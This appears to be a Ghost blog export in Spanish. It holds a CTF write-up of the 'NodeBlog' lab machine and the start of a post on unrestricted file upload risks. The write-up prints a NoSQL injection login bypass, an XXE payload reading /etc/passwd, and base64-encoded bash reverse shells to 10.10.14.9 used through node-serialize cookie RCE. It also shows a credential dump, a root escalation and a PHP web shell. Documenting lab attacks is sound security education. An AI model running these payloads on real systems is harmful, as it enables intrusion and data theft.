https://github.com/iocio005/flask-sqlinjection-vulnerable\ndocker-compose -f flask-sqlinjection-vulnerable/docker-compose.yml up\n\nAbre un navegador, entra a http://127.0.0.1 y extrae toda la información que puedas, como se ve a continuación.\n\nLa mayoría de las plataformas están exentas de este tipo de vulnerabilidades, aunque siempre aparecen casos nuevos que necesitan ser parcheados.\n\nSi eres desarrollador y quieres asegurarte de que en tu código no introduces este tipo de vulnerabilidades, probablemente estés exento de ellas si utilizas algún ORM o Framework. En cualquier caso, investiga los siguientes enlaces con el fin de prevenir estas vulnerabilidades en diferentes lenguajes:\n\n * C#\n * Python\n * Java\n * Php",
            "feature_image": "__GHOST_URL__/content/images/2022/01/sqlinjection2.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-01-30T20:39:26.000Z",
            "updated_at": "2022-12-30T23:26:44.000Z",
            "published_at": "2022-01-31T17:54:13.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112377",
            "uuid": "a6e93731-edf8-435a-9a81-9fae1eec7b78",
            "title": "CTF - NodeBlog WriteUP",
            "slug": "ctf-nodeblog-writeup",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p- --open -sT -vvv -n -Pn 10.10.11.139 -oG allPorts\"}],[\"code\",{\"language\":\"sh\",\"code\":\"nmap -p22,5000 -sCV -n -Pn -vvv 10.10.11.139 -oN targeted\\n# Scanned at 2022-02-01 20:20:50 CET for 15s\\n# PORT     STATE SERVICE REASON         VERSION\\n# 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n# | ssh-hostkey: \\n# |   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)\\n# | ssh-rsa\\n# |   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)\\n# | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=\\n# |   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)\\n# |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY\\n# 5000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)\\n# |_http-title: Blog\\n# | http-methods: \\n# |_  Supported Methods: GET HEAD POST OPTIONS\\n# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/Screenshot_2.png\",\"width\":609,\"height\":526}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ curl -X POST nodeblog.htb:5000/login -H \\\"Content-Type: application/json\\\" -d \\\"this is not a json\\\"\\n<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n<head>\\n<meta charset=\\\"utf-8\\\">\\n<title>Error</title>\\n</head>\\n<body>\\n<pre>SyntaxError: Unexpected token t in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/opt/blog/node_modules/body-parser/lib/types/json.js:158:10)<br> &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br> &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)</pre>\\n</body>\\n</html>\\n\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ curl -X POST nodeblog.htb:5000/login -H \\\"Content-Type: application/json\\\" -d \\\"{\\\\\\\"user\\\\\\\":,\\\\\\\"password\\\\\\\":{\\\\\\\"\\\\$gt\\\\\\\":\\\\\\\"\\\\\\\"}}\\\"\\n# funciona\"}],[\"code\",{\"language\":\"html\",\"code\":\"Invalid XML Example: \\n<post>\\n\\t<title>Example Post</title>\\n    <description>Example Description</description>\\n    <markdown>Example Markdown</markdown>\\n</post>\"}],[\"code\",{\"language\":\"xml\",\"code\":\"<root>\\n<title>hola</title>\\n<description>aaa</description>\\n<markdown>md</markdown>\\n</root>\"}],[\"code\",{\"language\":\"xml\",\"code\":\"<?xml version=\\\"1.0\\\" encoding=\\\"ISO-8859-1\\\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\" >]>\\n<root>\\n<title>hola</title>\\n<description>aaa</description>\\n<markdown>&xxe;</markdown>\\n</root>\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/Screenshot_4.png\",\"width\":907,\"height\":453}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ echo -n \\\"bash -i >& /dev/tcp/10.10.14.9/443 0>&1\\\" | base64\\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYx\\n❯ echo -n \\\"bash -i  >& /dev/tcp/10.10.14.9/443 0>&1\\\" | base64\\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgMD4mMQ==\\n❯ echo -n \\\"bash -i  >& /dev/tcp/10.10.14.9/443  0>&1\\\" | base64\\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgIDA+JjE=\\n❯ echo -n \\\"bash -i  >&  /dev/tcp/10.10.14.9/443  0>&1\\\" | base64\\nYmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx\\n\\n# Copio el siguiente código en la cookie de burpsuite\\n# echo -n YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx | base64 -d | bash\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/Screenshot_5.png\",\"width\":570,\"height\":128}],[\"code\",{\"language\":\"sh\",\"code\":\"❯ admin@nodeblog:/opt/blog$ mongo 127.0.0.1\\n❯ show databases\\nadmin   0.000GB\\nblog    0.000GB\\nconfig  0.000GB\\nlocal   0.000GB\\n❯ use blog\\nswitched to db blog\\n❯ show collections\\narticles\\nusers\\n❯ db.users.find()\\n{ \\\"_id\\\" : ObjectId(\\\"61b7380ae5814df6030d2373\\\"), \\\"createdAt\\\" : ISODate(\\\"2021-12-13T12:09:46.009Z\\\"), \\\"username\\\" : \\\"admin\\\", \\\"password\\\" : \\\"IppsecSaysPleaseSubscribe\\\", \\\"__v\\\" : 0 }\"}],[\"code\",{\"language\":\"sh\",\"code\":\"❯admin@nodeblog:/opt/blog$ sudo su -\\n[sudo] password for admin: \\n❯ root@nodeblog:~# whoami\\nroot\\n❯ root@nodeblog:~# cat /home/admin/user.txt\\ne83b0edb016a7146e2e5aa00f4416730\\n❯ root@nodeblog:~# cat root.txt\\nb38f827567b54906d52439592c719952\",\"caption\":\"\"}]],\"markups\":[[\"a\",[\"href\",\"https://hackmd.io/@Chivato/rkSqk9gbL\"]],[\"a\",[\"href\",\"https://snyk.io/test/npm/node-serialize#:~:text=node%2Dserialize%20serializes%20an%20object,into%20the%20unserialize()%20function\"]]],\"sections\":[[1,\"p\",[]],[1,\"p\",[[0,[],0,\"nmap me cuesta descubrir cosas. He tenido que ralentizar el comando de descubrir todos los pueortos porque no me encontraba ninguno más que el 22, A si que lo he lanzado normal\"]]],[10,0],[1,\"p\",[[0,[],0,\"y despues\"]]],[10,1],[1,\"p\",[[0,[],0,\"Foto\"]]],[10,2],[1,\"p\",[[0,[],0,\"Tiene un login.\"]]],[1,\"p\",[[0,[],0,\"Probamos sqlmap y no tiene inyecciones sql.\"]]],[1,\"p\",[]],[10,3],[1,\"p\",[[0,[],0,\"Esta intentando parsear json. nosql injection?\"]]],[10,4],[1,\"p\",[[0,[],0,\"Con burpsuite/repeater prueblo a hacer la llamada y mando al navegador la sesion iniciada\"]]],[1,\"p\",[[0,[],0,\"fotos de burpsuite y el boton upload\"]]],[1,\"p\",[[0,[],0,\"Subo un archivo normal y me sale esto si veo el html\"]]],[10,5],[1,\"p\",[[0,[],0,\"Veo que se pueden escribir articulos con \"]]],[3,\"ul\",[[[0,[],0,\"title\"]],[[0,[],0,\"description\"]],[[0,[],0,\"markdown\"]]]],[1,\"p\",[[0,[],0,\"Me genero un xml \"]]],[10,6],[1,\"p\",[[0,[],0,\"Y me lleva a la ventana de articulo con todo relleno.\"]]],[1,\"p\",[[0,[],0,\"Encuentro informacion sobre una vulnerabilidad de XML External entity (\"],[0,[0],1,\"https://hackmd.io/@Chivato/rkSqk9gbL\"],[0,[],0,\") y veo que se puede ejecutar codigo\"]]],[10,7],[10,8],[1,\"p\",[[0,[],0,\"Es vulnerable. Modifico el script para probar otras cosas.\"]]],[1,\"p\",[[0,[],0,\"Me acuerdo de que cuando me daba el error de json, me daba una ruta donde estaba la app /opt/blog\"]]],[1,\"p\",[[0,[],0,\"Encuentro que un archivo tipico de nodejs es el server.js e imprimo su contenido /opt/blog/server.js\"]]],[1,\"p\",[[0,[],0,\"Veo que usa node-serializer \"],[0,[1],1,\"https://snyk.io/test/npm/node-serialize#:~:text=node-serialize serializes an object,into the unserialize() function\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"En server.js veo que el serializador parsea la cookie y la vulnerabilidad esta en que en la cookie puedes poner codigo que ejecuta el programa.\"]]],[1,\"p\",[[0,[],0,\"con burpsuite hago pruebas y veo que a veces ejecuta codigo y a veces no. Como hay serializaciones y demas, escribo el codigo en base64 intentando que no haya ni '+' ni '=' poniendo espacios.\"]]],[10,9],[10,10],[1,\"p\",[[0,[],0,\"Antes de enviarlo, codifico el contenido de auth= a URLEncoding\"]]],[1,\"p\",[[0,[],0,\"Me pongo en esuccha en mi equipo con netcat y estoy dentro.\"]]],[1,\"p\",[[0,[],0,\"Entramos a mongodb y buscamos informacion del usuario\"]]],[10,11],[1,\"p\",[[0,[],0,\"Tenemos la contraseña. Vamos a probar a ejecutar \"]]],[10,12],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p></p><p>nmap me cuesta descubrir cosas. He tenido que ralentizar el comando de descubrir todos los pueortos porque no me encontraba ninguno más que el 22, A si que lo he lanzado normal</p><pre><code class=\"language-sh\">nmap -p- --open -sT -vvv -n -Pn 10.10.11.139 -oG allPorts</code></pre><p>y despues</p><pre><code class=\"language-sh\">nmap -p22,5000 -sCV -n -Pn -vvv 10.10.11.139 -oN targeted\n# Scanned at 2022-02-01 20:20:50 CET for 15s\n# PORT     STATE SERVICE REASON         VERSION\n# 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n# | ssh-hostkey: \n# |   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)\n# | ssh-rsa\n# |   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)\n# | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=\n# |   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)\n# |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY\n# 5000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)\n# |_http-title: Blog\n# | http-methods: \n# |_  Supported Methods: GET HEAD POST OPTIONS\n# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>Foto</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/Screenshot_2.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"609\" height=\"526\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/Screenshot_2.png 600w, __GHOST_URL__/content/images/2022/02/Screenshot_2.png 609w\"></figure><p>Tiene un login.</p><p>Probamos sqlmap y no tiene inyecciones sql.</p><p></p><pre><code class=\"language-sh\">❯ curl -X POST nodeblog.htb:5000/login -H \"Content-Type: application/json\" -d \"this is not a json\"\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;SyntaxError: Unexpected token t in JSON at position 0&lt;br&gt; &amp;nbsp; &amp;nbsp;at JSON.parse (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at createStrictSyntaxError (/opt/blog/node_modules/body-parser/lib/types/json.js:158:10)&lt;br&gt; &amp;nbsp; &amp;nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:83:15)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18&lt;br&gt; &amp;nbsp; &amp;nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)&lt;br&gt; &amp;nbsp; &amp;nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)&lt;br&gt; &amp;nbsp; &amp;nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)&lt;br&gt; &amp;nbsp; &amp;nbsp;at IncomingMessage.emit (events.js:412:35)&lt;br&gt; &amp;nbsp; &amp;nbsp;at endReadableNT (internal/streams/readable.js:1334:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>Esta intentando parsear json. nosql injection?</p><pre><code class=\"language-sh\">❯ curl -X POST nodeblog.htb:5000/login -H \"Content-Type: application/json\" -d \"{\\\"user\\\":,\\\"password\\\":{\\\"\\$gt\\\":\\\"\\\"}}\"\n# funciona</code></pre><p>Con burpsuite/repeater prueblo a hacer la llamada y mando al navegador la sesion iniciada</p><p>fotos de burpsuite y el boton upload</p><p>Subo un archivo normal y me sale esto si veo el html</p><pre><code class=\"language-html\">Invalid XML Example: \n&lt;post&gt;\n\t&lt;title&gt;Example Post&lt;/title&gt;\n    &lt;description&gt;Example Description&lt;/description&gt;\n    &lt;markdown&gt;Example Markdown&lt;/markdown&gt;\n&lt;/post&gt;</code></pre><p>Veo que se pueden escribir articulos con </p><ul><li>title</li><li>description</li><li>markdown</li></ul><p>Me genero un xml </p><pre><code class=\"language-xml\">&lt;root&gt;\n&lt;title&gt;hola&lt;/title&gt;\n&lt;description&gt;aaa&lt;/description&gt;\n&lt;markdown&gt;md&lt;/markdown&gt;\n&lt;/root&gt;</code></pre><p>Y me lleva a la ventana de articulo con todo relleno.</p><p>Encuentro informacion sobre una vulnerabilidad de XML External entity (<a href=\"https://hackmd.io/@Chivato/rkSqk9gbL\">https://hackmd.io/@Chivato/rkSqk9gbL</a>) y veo que se puede ejecutar codigo</p><pre><code class=\"language-xml\">&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;root&gt;\n&lt;title&gt;hola&lt;/title&gt;\n&lt;description&gt;aaa&lt;/description&gt;\n&lt;markdown&gt;&amp;xxe;&lt;/markdown&gt;\n&lt;/root&gt;</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/Screenshot_4.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"907\" height=\"453\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/02/Screenshot_4.png 600w, __GHOST_URL__/content/images/2022/02/Screenshot_4.png 907w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Es vulnerable. Modifico el script para probar otras cosas.</p><p>Me acuerdo de que cuando me daba el error de json, me daba una ruta donde estaba la app /opt/blog</p><p>Encuentro que un archivo tipico de nodejs es el server.js e imprimo su contenido /opt/blog/server.js</p><p>Veo que usa node-serializer <a href=\"https://snyk.io/test/npm/node-serialize#:~:text=node%2Dserialize%20serializes%20an%20object,into%20the%20unserialize()%20function\">https://snyk.io/test/npm/node-serialize#:~:text=node-serialize serializes an object,into the unserialize() function</a>.</p><p>En server.js veo que el serializador parsea la cookie y la vulnerabilidad esta en que en la cookie puedes poner codigo que ejecuta el programa.</p><p>con burpsuite hago pruebas y veo que a veces ejecuta codigo y a veces no. Como hay serializaciones y demas, escribo el codigo en base64 intentando que no haya ni '+' ni '=' poniendo espacios.</p><pre><code class=\"language-sh\">❯ echo -n \"bash -i &gt;&amp; /dev/tcp/10.10.14.9/443 0&gt;&amp;1\" | base64\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYx\n❯ echo -n \"bash -i  &gt;&amp; /dev/tcp/10.10.14.9/443 0&gt;&amp;1\" | base64\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgMD4mMQ==\n❯ echo -n \"bash -i  &gt;&amp; /dev/tcp/10.10.14.9/443  0&gt;&amp;1\" | base64\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgIDA+JjE=\n❯ echo -n \"bash -i  &gt;&amp;  /dev/tcp/10.10.14.9/443  0&gt;&amp;1\" | base64\nYmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx\n\n# Copio el siguiente código en la cookie de burpsuite\n# echo -n YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx | base64 -d | bash</code></pre><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/02/Screenshot_5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"570\" height=\"128\"></figure><p>Antes de enviarlo, codifico el contenido de auth= a URLEncoding</p><p>Me pongo en esuccha en mi equipo con netcat y estoy dentro.</p><p>Entramos a mongodb y buscamos informacion del usuario</p><pre><code class=\"language-sh\">❯ admin@nodeblog:/opt/blog$ mongo 127.0.0.1\n❯ show databases\nadmin   0.000GB\nblog    0.000GB\nconfig  0.000GB\nlocal   0.000GB\n❯ use blog\nswitched to db blog\n❯ show collections\narticles\nusers\n❯ db.users.find()\n{ \"_id\" : ObjectId(\"61b7380ae5814df6030d2373\"), \"createdAt\" : ISODate(\"2021-12-13T12:09:46.009Z\"), \"username\" : \"admin\", \"password\" : \"IppsecSaysPleaseSubscribe\", \"__v\" : 0 }</code></pre><p>Tenemos la contraseña. Vamos a probar a ejecutar </p><pre><code class=\"language-sh\">❯admin@nodeblog:/opt/blog$ sudo su -\n[sudo] password for admin: \n❯ root@nodeblog:~# whoami\nroot\n❯ root@nodeblog:~# cat /home/admin/user.txt\ne83b0edb016a7146e2e5aa00f4416730\n❯ root@nodeblog:~# cat root.txt\nb38f827567b54906d52439592c719952</code></pre>",
            "comment_id": "61f980a923be580061ee84da",
            "plaintext": "nmap me cuesta descubrir cosas. He tenido que ralentizar el comando de descubrir todos los pueortos porque no me encontraba ninguno más que el 22, A si que lo he lanzado normal\n\nnmap -p- --open -sT -vvv -n -Pn 10.10.11.139 -oG allPorts\n\ny despues\n\nnmap -p22,5000 -sCV -n -Pn -vvv 10.10.11.139 -oN targeted\n# Scanned at 2022-02-01 20:20:50 CET for 15s\n# PORT     STATE SERVICE REASON         VERSION\n# 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n# | ssh-hostkey: \n# |   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)\n# | ssh-rsa\n# |   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)\n# | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=\n# |   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)\n# |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY\n# 5000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)\n# |_http-title: Blog\n# | http-methods: \n# |_  Supported Methods: GET HEAD POST OPTIONS\n# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nFoto\n\nTiene un login.\n\nProbamos sqlmap y no tiene inyecciones sql.\n\n\n\n❯ curl -X POST nodeblog.htb:5000/login -H \"Content-Type: application/json\" -d \"this is not a json\"\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>SyntaxError: Unexpected token t in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at createStrictSyntaxError (/opt/blog/node_modules/body-parser/lib/types/json.js:158:10)<br> &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:83:15)<br> &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br> &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)</pre>\n</body>\n</html>\n\n\nEsta intentando parsear json. nosql injection?\n\n❯ curl -X POST nodeblog.htb:5000/login -H \"Content-Type: application/json\" -d \"{\\\"user\\\":,\\\"password\\\":{\\\"\\$gt\\\":\\\"\\\"}}\"\n# funciona\n\nCon burpsuite/repeater prueblo a hacer la llamada y mando al navegador la sesion iniciada\n\nfotos de burpsuite y el boton upload\n\nSubo un archivo normal y me sale esto si veo el html\n\nInvalid XML Example: \n<post>\n\t<title>Example Post</title>\n    <description>Example Description</description>\n    <markdown>Example Markdown</markdown>\n</post>\n\nVeo que se pueden escribir articulos con\n\n * title\n * description\n * markdown\n\nMe genero un xml\n\n<root>\n<title>hola</title>\n<description>aaa</description>\n<markdown>md</markdown>\n</root>\n\nY me lleva a la ventana de articulo con todo relleno.\n\nEncuentro informacion sobre una vulnerabilidad de XML External entity (https://hackmd.io/@Chivato/rkSqk9gbL) y veo que se puede ejecutar codigo\n\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n<title>hola</title>\n<description>aaa</description>\n<markdown>&xxe;</markdown>\n</root>\n\nEs vulnerable. Modifico el script para probar otras cosas.\n\nMe acuerdo de que cuando me daba el error de json, me daba una ruta donde estaba la app /opt/blog\n\nEncuentro que un archivo tipico de nodejs es el server.js e imprimo su contenido /opt/blog/server.js\n\nVeo que usa node-serializer https://snyk.io/test/npm/node-serialize#:~:text=node-serialize serializes an object,into the unserialize() function.\n\nEn server.js veo que el serializador parsea la cookie y la vulnerabilidad esta en que en la cookie puedes poner codigo que ejecuta el programa.\n\ncon burpsuite hago pruebas y veo que a veces ejecuta codigo y a veces no. Como hay serializaciones y demas, escribo el codigo en base64 intentando que no haya ni '+' ni '=' poniendo espacios.\n\n❯ echo -n \"bash -i >& /dev/tcp/10.10.14.9/443 0>&1\" | base64\nYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYx\n❯ echo -n \"bash -i  >& /dev/tcp/10.10.14.9/443 0>&1\" | base64\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgMD4mMQ==\n❯ echo -n \"bash -i  >& /dev/tcp/10.10.14.9/443  0>&1\" | base64\nYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgIDA+JjE=\n❯ echo -n \"bash -i  >&  /dev/tcp/10.10.14.9/443  0>&1\" | base64\nYmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx\n\n# Copio el siguiente código en la cookie de burpsuite\n# echo -n YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx | base64 -d | bash\n\nAntes de enviarlo, codifico el contenido de auth= a URLEncoding\n\nMe pongo en esuccha en mi equipo con netcat y estoy dentro.\n\nEntramos a mongodb y buscamos informacion del usuario\n\n❯ admin@nodeblog:/opt/blog$ mongo 127.0.0.1\n❯ show databases\nadmin   0.000GB\nblog    0.000GB\nconfig  0.000GB\nlocal   0.000GB\n❯ use blog\nswitched to db blog\n❯ show collections\narticles\nusers\n❯ db.users.find()\n{ \"_id\" : ObjectId(\"61b7380ae5814df6030d2373\"), \"createdAt\" : ISODate(\"2021-12-13T12:09:46.009Z\"), \"username\" : \"admin\", \"password\" : \"IppsecSaysPleaseSubscribe\", \"__v\" : 0 }\n\nTenemos la contraseña. Vamos a probar a ejecutar\n\n❯admin@nodeblog:/opt/blog$ sudo su -\n[sudo] password for admin: \n❯ root@nodeblog:~# whoami\nroot\n❯ root@nodeblog:~# cat /home/admin/user.txt\ne83b0edb016a7146e2e5aa00f4416730\n❯ root@nodeblog:~# cat root.txt\nb38f827567b54906d52439592c719952",
            "feature_image": "__GHOST_URL__/content/images/2022/02/Screenshot_1.png",
            "featured": 0,
            "type": "post",
            "status": "draft",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2022-02-01T18:49:13.000Z",
            "updated_at": "2022-02-24T19:10:23.000Z",
            "published_at": null,
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63a223c10057530148112378",
            "uuid": "45f6e578-d27b-4e52-8556-f741b96a41a8",
            "title": "Por qué permitir subir archivos a tu web es peligroso",
            "slug": "permitir-subir-archivos-a-tu-web-es-peligroso",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"bash\",\"code\":\"git clone https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability\\ncd Unrestricted-File-Upload-Vulnerability\\ndocker-compose up\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/02/ezgif-5-1b4b7d19e3-4.gif\",\"width\":600,\"height\":389}],[\"code\",{\"language\":\"php\",\"code\":\"<?php\\n\\techo system($_REQUEST['cmd']);\\n?>\"}],[\"code\",{\"language\":\"sh\",\"code\":\"http://127.0.0.1/php_rce.php?cmd=<command to execute>\"}]],\"markups\":[[\"a\",[\"href\",\"https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\"]],[\"a\",[\"href\",\"https://github.com/iocio005/Unrestricted-File-Upload-Vulnerability\"]],[\"strong\"],[\"em\"],[\"a\",[\"href\",\"https://imagetragick.com/\"]],[\"a\",[\"href\",\"https://www.cloudflare.com/es-es/learning/ddos/what-is-a-ddos-attack/\"]],[\"a\",[\"href\",\"https://aws.amazon.com/es/s3/\"]],[\"a\",[\"href\",\"https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html\"]],[\"a\",[\"href\",\"https://developer.mozilla.org/es/docs/Web/HTML/Attributes/accept\"]],[\"a\",[\"href\",\"https://dev.to/einlinuus/how-to-upload-files-with-php-correctly-and-securely-1kng\"]],[\"a\",[\"href\",\"https://developer.mozilla.org/es/docs/Web/HTTP/Basics_of_HTTP/MIME_types\"]],[\"a\",[\"href\",\"https://www.hypr.com/whitelist/\"]],[\"a\",[\"href\",\"https://owasp.org/www-community/attacks/csrf\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"El post de hoy va a tratar sobre el riesgo potencial que se crea en aquellas plataformas que permiten a los usuarios subir archivos a través de algún formulario.\"]]],[1,\"p\",[[0,[],0,\"Este tipo de plataformas van más allá que Facebook o Instagram, donde todos tenemos claro que se pueden subir fotos. También estamos hablando de cualquier web que te permite subir una imagen 